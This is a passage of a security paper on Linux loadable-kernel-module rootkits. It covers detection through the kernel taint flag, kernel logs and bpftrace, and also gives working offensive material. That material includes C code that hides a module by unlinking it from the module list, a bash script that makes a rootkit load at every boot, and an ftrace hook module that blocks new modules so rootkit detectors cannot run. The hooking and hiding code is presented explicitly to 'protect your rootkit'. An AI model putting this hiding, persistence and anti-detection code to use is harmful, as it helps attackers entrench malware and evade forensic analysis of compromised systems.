dumbledore@infect:~$ lsmod|grep diamorphine
dumbledore@infect:~$
dumbledore@infect:~$ sudo cat /proc/kallsyms|grep diamorphine
ffffffffc1152010 T diamorphine_init [diamorphine]
dumbledore@infect:~$
```

Checking '/proc/sys/kernel/tainted' is also very valid, since most LKM rootkits can never hide from tainted, which indicates the 'contamination' state of the kernel, signaling modifications or errors. In other words, when a rootkit without a signature is loaded, it 'contaminates' the kernel’s state. I’ll use diamorphine itself to demonstrate this.

```
dumbledore@infect:~$ sudo insmod diamorphine.ko
dumbledore@infect:~$ lsmod|grep diamorphine
dumbledore@infect:~$
dumbledore@infect:~$ sudo cat /proc/kallsyms|grep diamorphine
ffffffffc1152010 T diamorphine_init [diamorphine]
dumbledore@infect:~$
dumbledore@infect:~$ sudo cat /proc/sys/kernel/tainted
12288
dumbledore@infect:~$
```

Notice that there is a number there, which is 12288, indicating that the current state of the kernel has been contaminated, signaling the presence of modules without a signature. For a forensic analyst or someone who will examine the compromised machine, this is a strong indication that there is a rootkit on the machine.

#  3.3  Logs

Certainly, when an attacker is using an LKM rootkit, they will erase the logs. However, even if they delete some logs, there are still logs that most rootkit users probably don’t know exist.

The device '/dev/kmsg' is one of them, for example, which is a device for sending and reading real-time kernel messages. Even if you delete the dmesg logs using 'dmesg -C', or delete the logs in '/var/log/kern.log', the taint message ('module verification failed: signature and/or required key missing - tainting kernel'), which indicates that the kernel has been 'contaminated' for some reasons—one being that the LKM is not part of the official set of kernel modules, and another being that the kernel was unable to verify the module’s signature—will still appear in '/dev/kmsg'.

There’s also 'journalctl -k', which few people check when it comes to logs. It basically shows the kernel logs captured by systemd-journald. It’s no use deleting the logs from 'dmesg' and '/var/log/kern.log' if the logs still show up in 'journalctl -k'."


#  3.4  Rootkit

Without a doubt, using eBPF for LKM rootkit detection is very good and effective, especially against modern rootkits.

An example of this is creating tracepoints, for instance:

- sudo bpftrace -e 'tracepoint:syscalls:sys_enter_mkdir { printf("PID: %d, Directory Created: %s\n", pid, str(args->pathname)); }'

This will detect and print the name of the directory created when a directory is created.

Another example is when someone tries to load an LKM. This can also be monitored using bpftrace:

- sudo bpftrace -e 'tracepoint:module:module_load { printf("Module loaded: %s\n", str(args->name)); }'

Now, when someone tries to load an LKM, it will print the module name.

Another example is monitoring sys_enter_chdir:

- sudo bpftrace -e 'tracepoint:syscalls:sys_enter_chdir { printf("PID: %d, Changing to directory: %s\n", pid, str(args->filename)); }'

This will print the directory change when someone tries to change directories.

To check the list of kernel tests or tests in a program, simply check at:

- sudo bpftrace -l

I believe that using eBPF for detection is one of the best ways to detect LKM rootkits, because even with LKM hunters using detection techniques, it is still possible to avoid them.



# 4. Make an LKM rootkit visible

It is entirely possible to make an LKM rootkit. If a rootkit uses functions to make the module visible again, you can take advantage of that to make it visible.

Here we have a very simple C code:


```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/slab.h>

struct module_entry {
    struct list_head list;
    char *name;
    void *address;
};

static LIST_HEAD(module_list);

static void add_entry(char *name, void *address) {
    struct module_entry *mod;
    mod = kmalloc(sizeof(struct module_entry), GFP_KERNEL);
    if (!mod) {
        printk(KERN_ERR "Deu ruimkjkj.\n");
        return;
    }
    mod->name = name;
    mod->address = address;
    list_add_tail(&mod->list, &module_list);
}

static void magick_lol(void) {
    struct module_entry *entry;
    list_for_each_entry(entry, &module_list, list) {
        if (strcmp(entry->name, "module_show") == 0) {

            ((void (*)(void))entry->address)();
            break;
        }
    }
}

static int __init lkm_init(void) {
    add_entry("module_show", (void *)0xffffffffc09fbfa0); //endereço da função module_show
    magick_lol();

    return 0;
}

static void __exit lkm_exit(void) {
	printk(KERN_INFO "Qlq coisa kkjkjkjk\n");
}

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuz");
MODULE_DESCRIPTION("Sem descrição kkjkjk");
MODULE_VERSION("1.0");

module_init(lkm_init);
module_exit(lkm_exit);
```

In short, this simple code creates a linked list of structures called "module_entry" that has the name and address of the brokepkg function.

It adds an entry to the function that makes brokepkg visible again, called "module_show" with its address, then it calls the function called "magick_lol()" that searches for this entry in the list and if found, calls the function associated with she.

After the LKM is inserted, you can look in lsmod that brokepkg has become visible again, in which you can use rmmod to remove the LKM.

```
root@infect:~/leviathan# lsmod|grep brokepkg
root@infect:~/leviathan# cat /sys/kernel/tracing/available_filter_functions_addrs |grep module_show
ffffffffc0abafa0 module_show [brokepkg]
root@infect:~/leviathan# cat /sys/kernel/tracing/available_filter_functions |grep module_show
module_show [brokepkg]
root@infect:~/leviathan# insmod leviathan.ko
root@infect:~/leviathan# lsmod|grep brokepkg
brokepkg              159744  0
root@infect:~/leviathan#
```

 Well, this is one of the ways to make an LKM rootkit visible again, of course this is not 100% effective, and there are some ways to avoid this kind of thing and protect the rootkit, they are:

1 - Do not implement a method to make the rootkit visible.

 This documentation will also help a lot if you want to learn more about tracing.

- Kernel.org : [https://www.kernel.org/doc/html/v6.5/trace/index.html](https://www.kernel.org/doc/html/v6.5/trace/index.html)

#  5 Making

Most LKM rootkits that run on newer kernel versions use ftrace.

What most people don't know (I think) is that there is a way to disable ftrace on the machine, making any LKM rootkit that uses ftrace completely unusable, even when loaded and invisible.

```
root@infect:~/1337# mkdir br0k3_n0w_h1dd3n
root@infect:~/1337# ls
root@infect:~/1337# echo 0 > /proc/sys/kernel/ftrace_enabled
root@infect:~/1337# ls
br0k3_n0w_h1dd3n
root@infect:~/1337#
root@infect:~/1337#
root@infect:~/1337# echo 1 > /proc/sys/kernel/ftrace_enabled
root@infect:~/1337# ls
root@infect:~/1337#
root@infect:~/1337# ls
root@infect:~/1337# sysctl kernel.ftrace_enabled=0
kernel.ftrace_enabled = 0
root@infect:~/1337# ls
br0k3_n0w_h1dd3n
root@infect:~/1337# sysctl kernel.ftrace_enabled=1
kernel.ftrace_enabled = 1
root@infect:~/1337# echo 0 > /sys/kernel/debug/kprobes/enabled
root@infect:~/1337# ls
root@infect:~/1337#
```

 This is also a way to make an LKM rootkit "useless", preventing it from performing any action, as most current and public rootkits use ftrace. Of course, this is not 100% foolproof, as you just need to turn ftrace back on. However, many people don't know (I think) that it is possible to disable ftrace on the machine. Despite this, disabling ftrace and trying to analyze the machine looking for suspicious processes, directories, etc., is still ineffective.

# 6. Hiding

Hiding an LKM from tracing is relatively easy, with some specific techniques, we can also manipulate the way functions are registered and exposed in the kernel tracing system.

 A method that helps a lot with this is to use static or notrace functions, like this code here:

```c
root@infect:~/hidden_func# cat lkm.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

static void mtz(void) {
    printk(KERN_INFO "So eh um pequeno exemplo! Func escondida.\n");
}

static int __init inferi_init(void) {
    printk(KERN_INFO "LKM carregadoo!\n");
    mtz();
    list_del(&THIS_MODULE->list);
    return 0;
}

static void __exit inferi_exit(void) {
    printk(KERN_INFO "LKM removido!!\n");
}

module_init(inferi_init);
module_exit(inferi_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("et bilu");
MODULE_DESCRIPTION("brazilian phonk estragou o phonk.");
root@infect:~/hidden_func#
```

 In the example above, "mtz" is a static function that will not be exported and therefore will not appear in the list of functions available for tracing. Being prevented from registering it as a tracepoint.


```
root@infect:~/hidden_func# insmod lkm.ko
root@infect:~/hidden_func# lsmod|grep lkm
root@infect:~/hidden_func# cat /sys/kernel/tracing/available_filter_functions|grep lkm
root@infect:~/hidden_func# cat /sys/kernel/tracing/available_filter_functions|grep mtz
root@infect:~/hidden_func#
root@infect:~/hidden_func#
root@infect:~/hidden_func# cat /proc/kallsyms|grep lkm
ffffffffc0b69010 T inferi_init	[lkm]
root@infect:~/hidden_func# cat /proc/kallsyms|grep mtz
ffffffff911f8300 T _RNvXsa_NtCs3AkgXgqgK6r_4core3fmtzNtB5_5Debug3fmt
ffffffff911f8300 T _RNvXsb_NtCs3AkgXgqgK6r_4core3fmtzNtB5_7Display3fmt
ffffffff9253527c r __ksymtab__RNvXsa_NtCs3AkgXgqgK6r_4core3fmtzNtB5_5Debug3fmt
ffffffff9253533c r __ksymtab__RNvXsb_NtCs3AkgXgqgK6r_4core3fmtzNtB5_7Display3fmt
root@infect:~/hidden_func#
```

 And that's it, hidden function!

# 7. Persistence

I will show a good persistence method using "/etc/modules-load.d/".

```bash
#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root."
    exit 1
fi

read -p "Enter the full path to the *.ko: " ROOTKIT_PATH

if [ ! -f "$ROOTKIT_PATH" ]; then
    echo "Error: '$ROOTKIT_PATH' was not found."
    exit 1
fi

read -p "Enter the name of the rootkit (without .ko): " ROOTKIT_NAME

CONF_DIR="/etc/modules-load.d"
MODULE_DIR="/usr/lib/modules/$(uname -r)/kernel"

echo "Copying $ROOTKIT_PATH to $MODULE_DIR..."
mkdir -p "$MODULE_DIR"
cp "$ROOTKIT_PATH" "$MODULE_DIR/$ROOTKIT_NAME.ko"

echo "Running depmod..."
depmod

echo "Configuring the module to load on startup..."
echo "$ROOTKIT_NAME" > "$CONF_DIR/$ROOTKIT_NAME.conf"

echo "$ROOTKIT_NAME will be loaded automatically at startup."
```

This script essentially makes an LKM load automatically whenever the system is started. It copies the module to the directory '/usr/lib/modules/$(uname -r)/kernel' and makes the necessary configuration to have it loaded at boot by modifying configuration files in '/etc/modules-load.d'. This way, the rootkit will be loaded every time the system restarts.

And, of course, if you go to the directory '/usr/lib/modules/$(uname -r)/kernel', you will find the .ko file of your rootkit there. But that’s not the main concern, because it’s possible to implement a hook to hide the rootkit's name, and even if you go to this directory, the file will be invisible. The same applies to '/etc/modules-load.d/'.

# 8. Protecting

Protecting your LKM rootkit is essential against LKM rootkit hunters, such as 'ModTracer' (which I wrote), and also 'nitara2', which is a great LKM rootkit detector.

Protecting an LKM rootkit against this is actually very easy; you just need to hook the finit_module and init_module functions.

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("Hooking init_module and finit_module");
MODULE_VERSION("1.0");

static asmlinkage long (*hooked_init_module)(struct file *file, const char *uargs, unsigned long flags);
static asmlinkage long (*hooked_finit_module)(struct file *file, const char *uargs, unsigned long flags);

static asmlinkage long hook_init_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static asmlinkage long hook_finit_module(struct file *file, const char *uargs, unsigned long flags) {
    return 0;
}

static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_init_module", hook_init_module, &hooked_init_module),
    HOOK("__x64_sys_finit_module", hook_finit_module, &hooked_finit_module),
};

static int __init insmod_init(void) {
    int err;

    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if (err) {
        return err;
    }

    return 0;
}

static void __exit insmod_exit(void) {
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
}

module_init(insmod_init);
module_exit(insmod_exit);
```

The logic and functionality of the code above is actually very simple.

It works by replacing them with functions that return 0. Returning 0 indicates success, but by doing so, it blocks the execution of the original logic needed to load other LKMs, thus preventing the loading of new modules.

```
dumbledore@infect:~$ sudo insmod insmod.ko && sudo dmesg -C
dumbledore@infect:~$
dumbledore@infect:~$ sudo insmod modtracer.ko
dumbledore@infect:~$
dumbledore@infect:~$ dmesg
dumbledore@infect:~$ lsmod|grep modtracer
dumbledore@infect:~$
```

And that's it, now you can implement this to protect your rootkit.

# 9. The power of eBPF in detecting rootkits

 In my opinion, detection of more modern LKM rootkits can be accomplished in a few ways using features like eBPF. Projects such as Aqua Security's tracee and bpf-hookdetect are the most effective in this regard, easily identifying the syscalls that are being hooked. It is important to remember that these tools are only aimed at detection, mitigation is still very complex and is an open field of study. I believe that using eBPF to detect hooked syscalls is one of the best approaches currently, remembering that eBPF can also be used to create rootkits/hookar syscalls, and here are two tools that I consider very useful in this detection aspect:

 - [https://github.com/aquasecurity/tracee](https://github.com/aquasecurity/tracee)
 - [https://github.com/pathtofile/bpf-hookdetect](https://github.com/pathtofile/bpf-hookdetect)

# 10. Resources

- [https://github.com/MatheuZSecurity/detect-lkm-rootkit-cheatsheet](https://github.com/MatheuZSecurity/detect-lkm-rootkit-cheatsheet)
- [https://github.com/ksen-lin/nitara2](https://github.com/ksen-lin/nitara2)
- [https://github.com/MatheuZSecurity/ModTracer](https://github.com/MatheuZSecurity/ModTracer)
- [https://github.com/MatheuZSecurity/Rootkit](https://github.com/MatheuZSecurity/Rootkit)
- [https://github.com/MatheuZSecurity/Imperius](https://github.com/MatheuZSecurity/Imperius)
- [https://rezaduty-1685945445294.hashnode.dev/ebpf-cheatsheet](https://rezaduty-1685945445294.hashnode.dev/ebpf-cheatsheet)
- [https://phrack.org/issues/71/12](https://phrack.org/issues/71/12)
- [https://xcellerator.github.io/tags/rootkit/](https://xcellerator.github.io/tags/rootkit/)
- [https://github.com/DualHorizon/blackpill](https://github.com/DualHorizon/blackpill)
- [https://github.com/rphang/evilBPF](https://github.com/rphang/evilBPF)
- [https://github.com/a13xp0p0v/kernel-hardening-checker](https://github.com/a13xp0p0v/kernel-hardening-checker)
- [https://github.com/gianlucaborello/libprocesshider](https://github.com/gianlucaborello/libprocesshider)
- [https://github.com/hackerschoice/bpfhacks](https://github.com/hackerschoice/bpfhacks)
- [https://github.com/carloslack/KoviD](https://github.com/carloslack/KoviD)
- [https://github.com/m0nad/Diamorphine](https://github.com/m0nad/Diamorphine)

To see more content like this, I recommend joining my rootkit community on discord: [https://discord.gg/66N5ZQppU7](https://discord.gg/66N5ZQppU7)

# 11. Final Considerations


Rootkits in itself is a very interesting subject, especially when it comes to detection and mitigation, as it is very complex, and it is also a very open field of study, with several ideas and very cool topics to talk about, anyway, I hope If you liked it, please Any feedback or questions, don't hesitate to contact me on Twitter (@MatheuzSecurity) or contact Humzak711 on discord (serpentsobased). Thanks for taking the time to read!

```
root@infect:~# rmmod inferi
root@infect:~# dmesg
[ 1337.001337]
[ 1337.001337]      .  . '    .
[ 1337.001337]      '   .            . '            .                +
[ 1337.001337]              `                          '    . '
[ 1337.001337]        .                         ,'`.                         .
[ 1337.001337]   .                  .."    _.-;'    `.              .
[ 1337.001337]              _.-"`.##%"_.--" ,'        `.           "#"     ___,,od000
[ 1337.001337]           ,'"-_ _.-.--"\   ,'            `-_       '%#%',,/////00000HH
[ 1337.001337]         ,'     |_.'     )`/-     __..--""`-_`-._    J L/////00000HHHHM
[ 1337.001337] . +   ,'   _.-"        / /   _-""           `-._`-_/___\///0000HHHHMMM
[ 1337.001337]     .'_.-""      '    :_/_.-'   INFERIGANG    _,`-/__V__\0000HHHHHMMMM
[ 1337.001337] . _-""                         .        '   _,////\  |  /000HHHHHMMMMM
[ 1337.001337]_-"   .       '  +  .              .        ,//////0\ | /00HHHHHHHMMMMM
[ 1337.001337]       `                                   ,//////000\|/00HHHHHHHMMMMMM
[ 1337.001337].             '       .  ' .   .       '  ,//////00000|00HHHHHHHHMMMMMM
[ 1337.001337]     .             .    .    '           ,//////000000|00HHHHHHHMMMMMMM
[ 1337.001337]                  .  '      .       .   ,///////000000|0HHHHHHHHMMMMMMM
[ 1337.001337]  '             '        .    '         ///////000000000HHHHHHHHMMMMMMM
[ 1337.001337]                    +  .  . '    .     ,///////000000000HHHHHHHMMMMMMMM
[ 1337.001337]     '      .              '   .       ///////000000000HHHHHHHHMMMMMMMM
[ 1337.001337]   '                  . '              ///////000000000HHHHHHHHMMMMMMMM
[ 1337.001337]                           .   '      ,///////000000000HHHHHHHHMMMMMMMM
[ 1337.001337]       +         .        '   .    .  ////////000000000HHHHHHHHMMMMMMhs
[ 1337.001337]
[ 1337.001337]        Paper by Matheuz & Humzak711
[ 1337.001337]
[ 1337.001337]
root@infect:~# kill `ps aux`;
Connection to 1337rootkit closed.
```